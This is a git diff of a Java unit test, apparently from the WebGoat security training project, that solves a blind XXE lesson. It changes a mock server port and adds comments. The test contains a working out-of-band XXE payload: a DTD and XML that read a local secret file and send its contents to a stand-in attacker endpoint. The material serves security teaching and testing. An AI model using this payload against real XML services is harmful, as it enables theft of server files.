@@ -37,7 +37,7 @@ public class BlindSendFileAssignmentTest extends LessonTest {
     private String webGoatHomeDirectory;
 
     @Rule
-    public WireMockRule webwolfServer = new WireMockRule(8081);
+    public WireMockRule webwolfServer = new WireMockRule(9090);
 
     @Before
     public void setup() throws Exception {
@@ -71,18 +71,21 @@ public class BlindSendFileAssignmentTest extends LessonTest {
     @Test
     public void solve() throws Exception {
         File targetFile = new File(webGoatHomeDirectory, "/XXE/secret.txt");
+        //Host DTD on WebWolf site
         String dtd = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n" +
                 "<!ENTITY % file SYSTEM \"" + targetFile.toURI().toString() + "\">\n" +
-                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:8081/landing?text=%file;'>\">\n" +
+                "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://localhost:9090/landing?text=%file;'>\">\n" +
                 "%all;";
         webwolfServer.stubFor(get(WireMock.urlMatching("/files/test.dtd"))
                 .willReturn(aResponse()
                         .withStatus(200)
                         .withBody(dtd)));
         webwolfServer.stubFor(get(urlMatching("/landing.*")).willReturn(aResponse().withStatus(200)));
+
+        //Make the request from WebGoat
         String xml = "<?xml version=\"1.0\"?>" +
                 "<!DOCTYPE comment [" +
-                "<!ENTITY % remote SYSTEM \"http://localhost:8081/files/test.dtd\">" +
+                "<!ENTITY % remote SYSTEM \"http://localhost:9090/files/test.dtd\">" +
                 "%remote;" +
                 "]>" +
                 "<comment><text>test&send;</text></comment>";
